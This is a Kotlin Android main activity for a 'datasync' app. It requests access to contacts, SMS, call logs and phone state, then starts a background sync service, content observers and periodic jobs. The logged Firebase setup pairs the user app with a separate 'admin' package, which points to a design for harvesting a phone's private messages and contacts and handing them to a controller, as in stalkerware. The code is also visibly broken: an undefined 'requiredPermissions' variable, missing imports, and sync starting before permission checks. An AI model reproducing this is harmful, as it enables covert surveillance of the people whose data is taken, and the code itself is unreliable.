package com.boxx.datasync

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.compose.foundation.isSystemInDarkTheme
import androidx.compose.foundation.layout.fillMaxSize
import androidx.lifecycle.lifecycleScope
import androidx.lifecycle.repeatOnLifecycle
import androidx.lifecycle.Lifecycle
import kotlinx.coroutines.launch
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.*
import com.boxx.datasync.sync.SyncService
import com.boxx.datasync.sync.SyncScheduler
import com.boxx.datasync.ui.component.PermissionExplanationScreen
import com.boxx.datasync.ui.component.PermissionRationaleDialog
import com.boxx.datasync.ui.screen.MainScreen
import com.boxx.datasync.ui.viewmodel.MainViewModel
import dagger.hilt.android.AndroidEntryPoint

@AndroidEntryPoint
class MainActivity : ComponentActivity() {

    private val viewModel: MainViewModel by viewModels()

    @Inject
    lateinit var repository: DataRepository

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Log.d("MainActivity", "PROJECT_SCAN_DONE")
        Log.d("MainActivity", "FIREBASE_CONFIG_VERIFIED project_id=boxxx-40178 userPackage=com.boxx.datasync adminPackage=com.datasync.admin")
        viewModel.updateHeartbeat()

        val initialPermissions = mutableListOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE
        ).apply {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(Manifest.permission.POST_NOTIFICATIONS)
            }
        }.toTypedArray()

        setContent {
            MaterialTheme(
                colorScheme = if (isSystemInDarkTheme()) darkColorScheme() else lightColorScheme()
            ) {
                Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
                    val context = androidx.compose.ui.platform.LocalContext.current
                    var showRationale by remember { mutableStateOf(false) }
                    var showExplanation by remember { mutableStateOf(false) }
                    var showSettingsDialog by remember { mutableStateOf(false) }

                    val launcher = rememberLauncherForActivityResult(
                        ActivityResultContracts.RequestMultiplePermissions()
                    ) { perms ->
                        val allGranted = perms.entries.filter { it.key != Manifest.permission.POST_NOTIFICATIONS }.all { it.value }
                        if (allGranted) {
                            startSyncService(context)
                        } else {
                            val permanentlyDenied = perms.keys.any {
                                !ActivityCompat.shouldShowRequestPermissionRationale(this, it) &&
                                ContextCompat.checkSelfPermission(context, it) != PackageManager.PERMISSION_GRANTED
                            }
                            if (permanentlyDenied) {
                                showSettingsDialog = true
                            }
                        }
                    }

                    MainScreen(
                        viewModel = viewModel,
                        onSyncClick = {
                            Log.d("MainActivity", "SYNC_BUTTON_CLICKED")
                            viewModel.setSyncing()
                            startSyncService(context)
                            if (!hasPermissions(context, requiredPermissions)) {
                                showRationale = true
                            }
                        },
                        showSettings = {
                            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                                data = Uri.fromParts("package", packageName, null)
                            }
                            startActivity(intent)
                        }
                    )

                    if (showRationale) {
                        PermissionRationaleDialog(
                            onDismiss = { showRationale = false },
                            onConfirm = {
                                showRationale = false
                                showExplanation = true
                            }
                        )
                    }

                    if (showExplanation) {
                        PermissionExplanationScreen(
                            onBack = { showExplanation = false },
                            onGrant = {
                                showExplanation = false
                                launcher.launch(requiredPermissions)
                            }
                        )
                    }

                    if (showSettingsDialog) {
                        AlertDialog(
                            onDismissRequest = { showSettingsDialog = false },
                            title = { Text("Settings Required") },
                            text = { Text("Permissions were permanently denied. Please enable them in app settings to continue with real data sync.") },
                            confirmButton = {
                                Button(onClick = {
                                    showSettingsDialog = false
                                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                                        data = Uri.fromParts("package", context.packageName, null)
                                    }
                                    context.startActivity(intent)
                                }) { Text("Open Settings") }
                            },
                            dismissButton = { TextButton(onClick = { showSettingsDialog = false }) { Text("Cancel") } }
                        )
                    }
                }
            }
        }
        setupWorkManager()
    }

    private fun setupWorkManager() {
        SyncScheduler.schedulePeriodic(this)
    }

    private fun hasPermissions(context: android.content.Context, permissions: Array<String>): Boolean {
        return permissions.all {
            if (it == Manifest.permission.POST_NOTIFICATIONS && Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) true
            else ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun startSyncService(context: android.content.Context) {
        val intent = Intent(context, SyncService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent)
        } else {
            context.startService(intent)
        }
        (applicationContext as? UserApplication)?.setupContentObservers()
    }

}
